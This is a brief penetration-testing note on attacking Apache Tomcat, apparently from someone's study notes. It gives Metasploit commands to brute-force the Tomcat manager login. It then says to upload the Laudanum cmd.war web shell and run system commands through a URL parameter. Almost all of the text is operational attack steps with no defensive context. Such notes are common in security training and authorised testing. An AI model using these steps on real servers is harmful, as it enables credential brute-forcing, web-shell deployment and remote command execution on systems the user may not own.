# Apache Tomcat 
If you see the default Tomcat Web app and can enter in the username and password for the manager, then you can try to brute for the username and password with the following from metasploit:
```
use auxiliary/scanner/http/tomcat_mgr_login
set RHOST <THE_SERVER>
set RPORT <TOMCAT PORT>
set TARGETURI (if the manager is at a different location than the default /manager)
run
```

If you successfully logged in you can upload a war file
You can find *cmd.war* at **/usr/share/laudanum/jsp/cmd.war**

To access the shell, you must go to where the shell was deployed, below is an example of where it could be deployed:
`Address:8080/cmd/cmd.jsp?cmd=whoami`
